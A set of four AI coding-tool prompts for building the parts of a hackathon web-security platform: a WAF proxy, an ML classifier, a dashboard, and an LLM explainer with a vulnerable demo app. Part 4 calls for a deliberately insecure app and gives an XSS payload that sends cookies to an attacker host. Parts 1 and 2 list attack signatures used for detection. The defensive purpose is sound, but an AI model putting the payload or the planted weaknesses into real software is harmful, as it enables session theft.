# Part Prompts — one per person

Each person pastes **only their section** into their AI coding tool (Claude Code, Cursor, etc.). Each prompt is self-contained: it tells the AI what to build, what to mock, and how to know it's done — without needing anyone else's code to exist yet.

Before pasting: also give your coding AI the files `01_ARCHITECTURE.md` and `02_INTEGRATION_README.md` from this repo as context — they define the schema and contracts your prompt refers to.

---

## PART 1 — Reverse Proxy & Edge Enforcement

```
You are building the reverse proxy module of a hackathon security platform called
ShieldForge. This is module 1 of 4, built independently — read 02_INTEGRATION_README.md
(Boundaries 1, 2, 4, 6) for the exact contracts you must honor.

GOAL
Build a Next.js app, deployed on Vercel, that sits in front of any *.vercel.app origin
and acts as a transparent reverse proxy with synchronous rule-based protection and
asynchronous AI-assisted detection.

WHAT TO BUILD
1. `middleware.ts` — runs on every request. Does cheap synchronous checks:
   - Rate limiting per IP (in-memory map is fine for the demo; note Upstash Redis
     as the production upgrade).
   - A small rule-based WAF: reject requests whose path/query/body match obvious
     attack signatures (script tags, SQL keywords like UNION SELECT, path traversal
     ../, common PHP webshell patterns). This must work with ZERO dependency on the
     ML service — it's the fail-open safety net.
2. `app/[[...path]]/route.ts` — the actual proxy handler:
   - Look up the registered origin for the incoming request (origin config can be a
     simple JSON object keyed by a path prefix, e.g. /t/victim-shop → the real URL,
     until Supabase is wired — see mocking note below).
   - `fetch()` the real origin, forward method/headers/body, verify TLS.
   - On the response: parse `Set-Cookie` and report ONLY the flags (httponly, secure,
     samesite present or not) — never log cookie values.
   - Check for missing security headers (CSP, X-Content-Type-Options, etc.) and
     record which are missing.
   - Stream/return the response to the visitor WITHOUT waiting on step 3.
3. An async "emit event" function that builds the JSON payload defined in
   02_INTEGRATION_README.md Boundary 1 and Boundary 2, and:
   - Calls `POST {ML_SERVICE_URL}/classify` (mock this: stub it to return
     `{attack_detected: true/false, attack_class, confidence, risk_score,
     action_recommended}` based on simple keyword matching, behind an env flag
     `USE_REAL_ML=false`)
   - Writes the resulting event (and a finding+incident if confidence crosses the
     policy threshold) to Supabase (mock this too: if `WRITE_TO_SUPABASE=false`,
     just `console.log` the payload instead of calling Supabase)
4. A tiny origin registration mechanism: a JSON/ENV-based list of
   `{ path_prefix, origin_url }` is enough for the hackathon — a real UI for this
   lives in the dashboard (Part 3), you just need to honor whatever config shape
   they'll eventually push to you (read Boundary 4).
5. Read `policies` (mock as a hardcoded object: `{ auto_block_threshold: 0.9,
   alert_threshold: 0.6, mode: 'shadow' }`) to decide whether a high-confidence
   detection actually blocks (enforce mode) or just logs (shadow mode).

CONSTRAINTS
- Must run and be testable with ZERO other modules deployed. Use a public URL
  (e.g. https://httpbin.org or https://example.com) as a stand-in origin during
  your own development.
- State in a code comment at the top of the proxy route: Vercel serverless has
  cold starts and execution-time limits, so this is a demo data plane, not a
  24/7 production WAF — that's an intentional, stated tradeoff.
- Never block the visitor's response waiting on the ML call or the DB write.

ACCEPTANCE TESTS (must pass before you call this done)
- [ ] A normal GET request through the proxy returns the same content as the
      origin, with no added latency beyond the extra fetch.
- [ ] A request with `<script>` in the query string gets a 403 from the
      rule-based WAF, with no dependency on the ML mock or Supabase.
- [ ] A request with `UNION SELECT` in the body gets a 403.
- [ ] Hitting the proxy 50+ times rapidly from the same IP triggers rate limiting.
- [ ] A response with a cookie missing HttpOnly logs that fact (check your
      console/mock-DB output) without ever logging the cookie's value.
- [ ] Killing/removing the ML mock does not break the proxy — rule-based
      blocking still works (this proves the fail-open design).
- [ ] You can register a second origin and route to it via a different
      path prefix.

Build it now. Ask me one clarifying question only if something above is
genuinely ambiguous — otherwise pick the sensible default and build.
```

---

## PART 2 — ML Detection Engine (Jev-style decision layer)

```
You are building the ML detection microservice for a hackathon security platform
called ShieldForge. This is module 2 of 4, fully standalone — read
02_INTEGRATION_README.md (Boundary 1) for the exact request/response contract.
This service has NO dependency on the proxy, dashboard, or database. Test it
with curl/Postman only.

GOAL
A FastAPI service, deployable to Render/Railway/HF Spaces, exposing a single
endpoint that takes HTTP request/response/session features and returns a typed,
confidence-scored decision — this mimics a "Jev-style" fast decision layer
(typed classification + calibrated confidence, no free-text reasoning).

WHAT TO BUILD
1. `POST /classify` — request/response shape EXACTLY as defined in
   02_INTEGRATION_README.md Boundary 1. Do not deviate from this shape; the
   proxy team is coding against it right now without talking to you.
2. Feature extraction from the raw request fields you're given:
   - URL/query length, special-character ratio, entropy
   - keyword hits: `<script>`, `UNION SELECT`, `../`, `php://`, `eval(`,
     `base64_decode`, common webshell strings
   - cookie-flag red flags from `response_meta`
   - session anomaly features already pre-computed and handed to you in
     `session_features` (ip_change_count, ua_change_count, asn_changed)
3. Model 1 — attack classifier: train a LightGBM (or DistilBERT if you have
   time) multi-class classifier on public data:
   - CSIC 2010 HTTP dataset (benign + malicious HTTP requests)
   - CICIDS2017 (network-level attack patterns, for diversity)
   - Supplement malicious examples from PayloadsAllTheThings (XSS, SQLi
     payload lists) mixed with your own benign traffic samples
   - Classes: `xss | sqli | php_rce | scanner | cred_stuffing | benign`
   - Output a calibrated probability per class — `confidence` is the max
     class probability.
4. Model 2 — behavioral/session anomaly: an unsupervised Isolation Forest
   trained on normal session feature vectors (ip_change_count, ua_change_count,
   asn_changed, request_rate). Flags session-replay-style anomalies. Feed its
   anomaly score into `risk_score` (bucket into 1–5).
5. Decision logic that maps model outputs to the typed response:
   `attack_detected`, `attack_class`, `confidence`, `risk_score`,
   `action_recommended` (log/alert/rate_limit/challenge/temp_block — pick by
   confidence bands: <0.6 → log, 0.6–0.9 → alert, >0.9 → temp_block/challenge
   depending on class).
6. A `/health` endpoint returning 200 OK, for the integration step.

CONSTRAINTS
- This is NOT on Vercel — Python/sklearn/LightGBM doesn't belong there. Deploy
  separately (Render/Railway/HF Spaces free tier) and give the team the URL.
- Response latency matters: target under 300ms per `/classify` call, since the
  proxy calls this on every flagged request.
- Never assume you'll receive raw cookie values or passwords — you won't,
  by design. Work only with the hashed/flagged fields in the contract.

ACCEPTANCE TESTS (must pass before you call this done)
- [ ] `POST /classify` with a request containing `<script>` in the path
      returns `attack_detected: true`, `attack_class: "xss"`, confidence > 0.7.
- [ ] A clearly benign GET request returns `attack_detected: false`,
      `attack_class: "benign"`.
- [ ] A `UNION SELECT` payload classifies as `sqli`.
- [ ] Report precision/recall on a held-out labelled test split — write the
      numbers in a `RESULTS.md` in this folder. This is your "50% faster /
      better detection" evidence for the judges.
- [ ] A synthetic session with `ip_change_count_5min: 5, asn_changed: true`
      produces a materially higher `risk_score` than a normal session.
- [ ] Service runs and answers correctly via `curl` with ZERO other modules
      running.
- [ ] `/health` returns 200.

Build it now. Ask me one clarifying question only if something above is
genuinely ambiguous — otherwise pick the sensible default and build.
```

---

## PART 3 — Dashboard, Control Plane & Supabase Schema

```
You are building the dashboard, control-plane API, and database schema for a
hackathon security platform called ShieldForge. This is module 3 of 4. You OWN
the Supabase schema — the exact DDL is in 01_ARCHITECTURE.md §5, copy it
verbatim into `dashboard/supabase/schema.sql` and run it. Read
02_INTEGRATION_README.md (Boundaries 2, 3, 4) for what the other modules expect
from you.

GOAL
A Next.js app on Vercel, backed by Supabase, that is the "brain" and the face
of the platform: live findings/incidents feed, origin onboarding, policy
editing, fix verification, and a compliance export.

WHAT TO BUILD
1. Run the schema from 01_ARCHITECTURE.md §5 in your Supabase project. Enable
   Realtime on `events`, `findings`, `incidents`.
2. Origin onboarding UI: a form where the user pastes a `*.vercel.app` URL,
   which creates a row in `origins` and a default `policies` row (mode: shadow,
   auto_block_threshold: 0.9). This is literally the entire "connect your
   domain" feature for the demo — no DNS involved.
3. Live dashboard page:
   - Subscribe to `findings` and `incidents` via Supabase Realtime; new rows
     appear without a page refresh.
   - Show severity, category, status, and `ai_summary` (will be null until
     Part 4's agent fills it in — render a "Generating explanation..."
     placeholder for null).
   - A small "detection time" chart: time between `events.ts` and the
     corresponding `findings.created_at`, compared against a hardcoded
     "manual review baseline" (e.g. 15 minutes) — this is your 50%-improvement
     proof slide, make it a real chart from real data.
4. Policy editor: a simple form per origin to adjust `auto_block_threshold`,
   `alert_threshold`, and toggle `mode` between `shadow` and `enforce`. Expose
   this as `PATCH /api/policies/[origin_id]` (Boundary 4) — Part 1's proxy will
   read this table directly, so writing it correctly is enough, no need to push
   anything to the proxy.
5. "Verify fix" button on a finding: on click, call a stub function
   `recheckFinding(findingId)` that (for the demo) just flips
   `findings.status` to `fixed_verified` after a short simulated delay — note
   in a comment that production would replay a safe test request through the
   proxy and re-check the specific vulnerability.
6. CERT-In export: a button that generates a downloadable PDF/CSV/JSON of all
   incidents in the last 6 hours with timestamps, actions taken, and
   affected origin — this directly answers India's CERT-In 6-hour reporting
   requirement, call this out explicitly in the UI copy.
7. A minimal training-module tab: list `training_users` sorted by
   `risk_score` descending, with a "risk trending" sparkline per user (reads
   `training_events`). Part 4 owns writing to these tables; you just need to
   render them.

CONSTRAINTS
- This module must be fully testable and demoable using ONLY seed data you
  insert yourself via SQL — do not wait for the proxy or ML service to exist.
- Use Supabase Row Level Security sensibly, but don't let it block your own
  demo — a permissive policy scoped to an authenticated demo user is fine for
  a hackathon.

ACCEPTANCE TESTS (must pass before you call this done)
- [ ] Inserting a row into `findings` via raw SQL makes it appear on the
      dashboard within ~1 second, with no page refresh.
- [ ] The origin onboarding form creates a real `origins` row and a matching
      default `policies` row.
- [ ] Changing a policy via the UI persists and is readable back from Supabase.
- [ ] Clicking "Verify fix" on a seeded finding flips its status and the UI
      updates live.
- [ ] CERT-In export produces a downloadable file containing seeded incident
      data.
- [ ] The detection-time chart renders correctly from seed data alone.
- [ ] Everything above works with the proxy and ML service NOT running.

Build it now. Ask me one clarifying question only if something above is
genuinely ambiguous — otherwise pick the sensible default and build.
```

---

## PART 4 — LLM Explanation Agent + Vulnerable Demo App + Behavioral Training Module

```
You are building three small, related pieces for a hackathon security platform
called ShieldForge: the deliberately-vulnerable demo victim app, the LLM agent
that turns findings into plain-English incident reports, and a minimal
behavioral-training module. This is module 4 of 4. Read
02_INTEGRATION_README.md (Boundary 5, 6) for the exact contracts.

IMPORTANT SCOPE NOTE: the vulnerable app and attack payloads you build here are
for demonstrating your OWN platform catching issues on your OWN test
deployment, for a hackathon judged on defensive security tooling. Do not point
any of this at real third-party sites, real user data, or production services.

GOAL
Three small Next.js pieces, each independently testable:

PIECE A — Vulnerable demo app (`victim-app/`), deployed standalone to Vercel
1. A tiny app (a guestbook/comment page is enough) with two DELIBERATE
   weaknesses, clearly commented as intentional:
   - On "login" (can be a fake, no real auth needed), set a session cookie
     WITHOUT `HttpOnly` or `Secure` flags.
   - A comment/input field that renders user input without sanitization
     (stored or reflected XSS), so a payload like
     `<script>fetch('https://attacker.vercel.app/c?'+document.cookie)</script>`
     actually executes.
2. This app must run standalone, with no dependency on anything else — it's
   just a normal (deliberately insecure) Next.js app.

PIECE B — LLM explanation agent (`llm-agent/`)
1. An API route `POST /api/explain` that takes a `findings`-shaped JSON
   (exact shape in 02_INTEGRATION_README.md Boundary 5) and returns an
   `ai_summary` string: 2-4 sentences, plain English, explaining what
   happened, why it matters, and a recommended fix. No jargon dump — write
   for a non-security founder reading their own dashboard.
2. Call OpenRouter first (model: your choice, something fast/cheap like a
   Llama or Mistral variant). On error or >4s timeout, fall back to Groq.
   If you have time, add NVIDIA NIM as a third fallback or for an
   embeddings-based "similar past incidents" feature — optional, don't block
   on it.
3. A polling or webhook mechanism that watches the `findings` table for rows
   where `ai_summary is null`, calls `/api/explain`, and writes the result
   back. Polling every 5-10s is fine and simpler than webhooks under time
   pressure — use polling.

PIECE C — Behavioral training module (`llm-agent/training/` or similar)
1. A "phishing simulation" trigger: a function that creates `training_events`
   rows of type `phishing_sent` for a list of `training_users`, and a simple
   tracking link/endpoint that records `phishing_clicked` when visited.
2. Risk scoring: a simple rule (e.g. +10 per click, -2 per week without a
   click, floor at 0) that updates `training_users.risk_score`.
3. Adaptive assignment: when a user's risk_score crosses a threshold (e.g.
   30), insert a `lesson_assigned` training_event. A "lesson" can just be a
   static markdown tip for the hackathon — the point is the automated
   trigger, not lesson content quality.

CONSTRAINTS
- Piece A must be deployable and demoable with zero dependency on anything else.
- Piece B must be testable with a hardcoded mock finding JSON — don't wait for
  the real `findings` table to have data.
- Piece C must be testable by directly inserting/reading `training_*` rows.

ACCEPTANCE TESTS (must pass before you call this done)
- [ ] Victim app deployed standalone; manually confirm the session cookie is
      missing HttpOnly/Secure (check browser devtools) and the XSS payload
      actually executes in a test browser tab.
- [ ] `POST /api/explain` with the mock finding JSON from
      02_INTEGRATION_README.md returns a coherent 2-4 sentence English
      explanation.
- [ ] Killing/invalidating the OpenRouter key and re-running the same request
      successfully falls back to Groq.
- [ ] Running the polling loop against a Supabase table with one seeded
      `findings` row (ai_summary null) results in that row getting a real
      ai_summary within one polling interval.
- [ ] Triggering the phishing simulation function creates the expected
      `training_events` rows; simulating 3 clicks for one user raises their
      risk_score and triggers a `lesson_assigned` event.

Build it now. Ask me one clarifying question only if something above is
genuinely ambiguous — otherwise pick the sensible default and build.
```
